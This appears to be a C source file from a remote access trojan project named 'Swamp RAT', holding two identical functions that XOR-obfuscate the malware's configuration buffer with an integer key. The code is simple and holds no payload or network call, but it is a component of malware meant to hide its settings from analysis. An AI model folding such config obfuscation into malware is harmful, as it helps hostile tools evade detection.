// Swamp RAT Encryption Library

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include "../defs.h"

bool crypt_encrypt_xor_config(char *data,
                       int data_size,
                       int key){
  /*
    :TODO: encrypt config data structure
    :data: pointer to data structure
    :data_size: size of config
    :key: xor integer key
    :returns: bool
  */
  for (int i = 0; i < data_size; i++){
    if (i > (int)sizeof(int) - 1){
      data[i] = data[i]^key;
    }
  }
  return true;
}

bool crypt_decrypt_xor_config(char *data,
                       int data_size,
                       int key){
   /*
    :TODO: decrypt config data structure
    :data: pointer to data structure
    :data_size: size of config
    :key: xor integer key
    :returns: bool
  */
  for (int i = 0; i < data_size; i++){
    if (i > (int)sizeof(int) - 1){
      data[i] = data[i]^key;
    }
  }
  return true;
}
